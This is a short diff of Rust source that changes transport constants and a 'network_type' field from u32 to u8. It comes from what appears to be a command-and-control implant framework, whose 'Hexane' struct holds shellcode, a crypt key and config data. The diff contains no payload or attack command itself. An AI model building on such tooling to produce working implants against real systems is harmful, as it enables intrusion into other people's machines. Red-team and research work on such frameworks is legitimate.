@@ -24,8 +24,8 @@ const COMMAND_SHUTDOWN:     u32 = 0x00000004;
 const COMMAND_UPDATE_PEER:  u32 = 0x00000005;
 
 lazy_static!(
-    pub(crate) static ref TRANSPORT_HTTP: u32 = 1;
-    pub(crate) static ref TRANSPORT_PIPE: u32 = 0;
+    pub(crate) static ref TRANSPORT_HTTP: u8 = 0;
+    pub(crate) static ref TRANSPORT_PIPE: u8 = 1;
 );
 
 #[derive(Debug)]
@@ -186,7 +186,7 @@ pub struct Hexane {
     pub(crate) crypt_key:       Vec<u8>,
     pub(crate) shellcode:       Vec<u8>,
     pub(crate) config_data:     Vec<u8>,
-    pub(crate) network_type:    u32,
+    pub(crate) network_type:    u8,
     pub(crate) active:          bool,
 
     pub(crate) main:            Config,
